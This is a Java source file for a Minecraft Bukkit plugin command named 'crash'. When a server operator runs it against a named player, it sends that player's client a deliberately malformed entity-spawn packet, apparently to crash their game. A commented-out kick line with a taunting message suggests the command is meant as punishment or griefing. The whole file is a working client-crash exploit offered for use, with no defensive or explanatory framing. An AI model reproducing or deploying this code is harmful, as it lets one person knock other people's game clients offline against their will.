/*
 *  Created by Filip P. on 2/2/15 11:24 PM.
 */

package me.pauzen.alphacore.commands.premade;

import me.pauzen.alphacore.commands.Command;
import me.pauzen.alphacore.commands.CommandListener;
import me.pauzen.alphacore.commands.CommandMeta;
import me.pauzen.alphacore.utils.UnsafeBukkitClasses;
import me.pauzen.alphacore.utils.commonnms.EntityPlayer;
import me.pauzen.alphacore.utils.commonnms.Packet;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

@CommandMeta(
        aliases = {"c"},
        value = "crash"
)
public class CrashCommand extends Command {

    @Override
    public CommandListener defaultListener() {
        return new CommandListener("core.crash") {

            @Override
            public void onRun() {
                Player target = Bukkit.getPlayer(args[0]);
                if (target == null) {
                    return;
                }

                EntityPlayer entityPlayer = new EntityPlayer(target);
                try {
                    entityPlayer.getPlayerConnection().sendPacket(
                            new Packet("PacketPlayOutSpawnEntityLiving")
                                    .initPacket(
                                            new Class[]{UnsafeBukkitClasses.getNMSClass("EntityLiving")},
                                            new Object[]{entityPlayer.getEntityPlayer()}));
                } catch (IllegalAccessException | InstantiationException e) {
                    e.printStackTrace();
                }
                //target.kickPlayer("You have been a bad, bad boy.");
            }
        };
    }
}
